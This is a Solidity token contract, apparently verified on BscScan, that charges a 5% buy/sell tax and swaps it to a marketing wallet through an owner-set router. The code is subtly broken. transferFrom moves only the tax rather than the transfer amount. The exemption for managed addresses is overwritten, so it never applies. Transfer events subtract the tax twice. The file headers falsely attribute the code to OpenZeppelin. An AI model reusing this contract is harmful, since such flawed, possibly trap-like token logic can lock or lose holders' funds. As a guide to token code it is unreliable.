/**
 *Submitted for verification at BscScan.com on 2022-05-29
*/

// File: .deps/SafeMath.sol


// OpenZeppelin Contracts v4.4.1

pragma solidity ^0.8.4;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b; // assert(a == b * c + a % b);
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;
    return c;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

// File: .deps/SwapRouter.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.4;

interface SwapRouter {
    function swapExactTokensForETH( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external returns ( uint256[] memory amounts );

    function getAmountsOut( uint256 amountIn, address[] calldata path ) external view returns ( uint256[] memory amounts );
}
// File: .deps/ERC20.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.4;



contract ERC20 {
    using SafeMath for uint256;
    SwapRouter internal router;
    
    mapping(address => uint256) private balance; //Direcciones con Supply repartido
    mapping(address => mapping(address => uint256)) private allowances;

    mapping(address => bool) internal swap; //Swap en el DEX
    mapping(address => bool) internal managedAddress; //Direcciones sin Tax
    
    string _name; //Nombre del ERC20
    string _symbol; //Simbolo del ERC20
    uint8 _decimals; //Decimales del ERC20
    uint256 _totalSupply; //Supply del ERC20

    address private owner; //Creador de This Contract
    address internal routerAddress; //Contrato del DEX
    address internal marketing; //Wallet de Marketing
    address[] internal path; //Pares (ThisToken, BNB, BUSD)
    address[] internal pricePath; //Precio de los Pares en $usd
    
    constructor(
        string memory name_, //Settear Nombre durante el Deploy
        string memory symbol_, //Settear Simbolo durante el Deploy
        uint8 decimals_, //Settear Decimales durante el Deploy
        uint256 totalSupply_, //Settear Supply durante el Deploy
        address marketing_ //Settear Wallet de Marketing durante el Deploy
        ) {
        owner = msg.sender;
        marketing = marketing_;
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * 10**_decimals;
        
        managedAddress[address(this)] = true;
        managedAddress[marketing] = true;

        balance[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    //Información del ERC20
    function name() public view returns (string memory) {return _name;}
    function symbol() public view returns (string memory) {return _symbol;}
    function decimals() public view returns (uint8) {return _decimals;}
    function totalSupply() public view returns (uint256) {return _totalSupply;}

    // Custom views
    function balanceOf(address wallet) public view returns (uint256) { return balance[wallet]; }

    function getCurrentPrice() external view returns (uint256) { return _getCurrentPrice(); }

    function _getCurrentPrice() internal view returns (uint256) {
        // Returns the price of the token in BUSD with 3 decimals
        uint256[] memory _amounts = router.getAmountsOut( 10**_decimals, pricePath );
        return _amounts[_amounts.length - 1].div(10**15);
    }

    // Permission system
    modifier onlyOwner() {
        require(msg.sender == owner, "You are not the owner.");
        _;
    }

    function renounceOwnership() external onlyOwner {
        owner = address(0);
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    //Settear DEX(Pancackeswap)
    function setPath(address[] calldata _path) external onlyOwner {
        delete path;
        delete pricePath;
        path.push(address(this));
        path.push(_path[0]);
        pricePath.push(address(this));
        pricePath.push(_path[0]);
        pricePath.push(_path[1]);
    }

    function setRouter(address _router) external onlyOwner {
        routerAddress = _router;
        router = SwapRouter(_router);
        _approve(address(this), _router, 2**250);
    }

    //Settear Tax of ERC20
    function tax(address sender, address recipient, uint256 amount) internal returns(uint256, uint256) {
        uint256 _tax;

        // Managed addresses don't pay taxes
        if (managedAddress[sender] || managedAddress[recipient]) { _tax = 0; }

        // The user is selling tokens
        if (swap[recipient]) {
            _tax = amount.div(20); // 5% commission to be payed in bnb
            _autoSwap(sender, _tax);
            amount = amount.sub(_tax);
        }

        // The user is buying tokens
        if (swap[sender]) {
            _tax = amount.div(20); // 5% commission to be payed in bnb
            _autoSwap(sender, _tax);

            amount = amount.sub(_tax);
        }

        return (amount, _tax);
    }

    //Swap del ERC20 en el DEX
    function _autoSwap(address _sender, uint256 _amount) internal {
        require(balance[_sender] >= _amount, "Not enough usable balance.");

        balance[_sender] = balance[_sender].sub(_amount);
        
        if ( balance[address(this)] < 10**_decimals ) {
            balance[marketing] = balance[marketing].add(_amount);
            return;
        }

        balance[address(this)] = balance[address(this)].add(_amount);
        if (!swap[_sender]) _swap(marketing, balance[address(this)]);
    }

    function _swap(address _to, uint256 _amount) internal {
        router.swapExactTokensForETH( _amount,  0,  path,  _to, block.timestamp + 30 minutes );
    }

    //Eventos del ERC20
    event Transfer(address indexed sender, address indexed recipient, uint256 amount);
    event Approval(address indexed wallet, address indexed spender, uint256 amount);

    function allowance(address wallet, address spender) public view returns (uint256) { return allowances[wallet][spender]; }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        
        emit Approval(_msgSender(), spender, amount);
        return true;
    }

    function _approve( address wallet, address spender, uint256 amount ) internal {
        require(wallet != address(0), "You can not approve from the zero address");
        require(spender != address(0), "You can not approve from the zero address");
        
        allowances[wallet][spender] = amount;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        uint256 _tax;
        ( amount, _tax ) = tax( _msgSender(), recipient, amount );

        _transfer(_msgSender(), recipient, amount);

        if (msg.sender == address(this) || recipient == address(this)) return true;
        emit Transfer(msg.sender, recipient, amount.sub(_tax));
        return true;
    }

    function _transfer( address sender, address recipient, uint256 amount ) internal {
        require(sender != address(0), "You can not swap from the zero address");
        require(recipient != address(0), "You can not swap to the zero address");
        require(balance[sender] >= amount, "You have not enough funds");
        
        balance[sender] = balance[sender].sub(amount);
        balance[recipient] = balance[recipient].add(amount);
        
        emit Transfer(sender, recipient, amount);
    }

    function transferFrom( address sender, address recipient, uint256 amount ) public returns (bool) {
        require( allowances[sender][msg.sender] >= amount || msg.sender == sender,  "Allowance is lower than requested funds"  );

        if (msg.sender != sender) allowances[sender][msg.sender] = allowances[sender][msg.sender].sub(  amount );
        
        uint256 _tax;
        (amount, _tax) = tax(sender, recipient, amount);
        _transfer(sender, recipient, _tax);

        if (sender == address(this) || recipient == address(this)) return true;
        emit Transfer(sender, recipient, _tax);
        return true;
    }
}